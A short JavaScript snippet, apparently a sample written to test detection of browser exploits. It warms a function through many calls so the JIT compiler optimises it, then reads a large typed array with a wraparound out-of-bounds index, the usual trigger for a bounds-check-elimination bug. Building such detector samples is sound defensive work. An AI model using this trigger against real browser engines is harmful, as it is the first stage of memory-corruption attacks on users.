// Minimal staged BCE trigger: a symbolically-sized victim buffer probed
// with a wraparound index. No CVE string: the staging plus the pattern
// is the conviction, not the name.
var SIZE = 0x1000000;
var buf = new Uint8Array(SIZE);
buf.fill(0);

function probe(arr, idx) {
  var v1 = arr[idx + 100];
  var v2 = arr[(idx + 0x80000000) | 0];
  return [v1, v2];
}

for (var i = 0; i < 50000; i++) {
  probe(buf, 0);
}
var out = probe(buf, 0x7ffffff0);
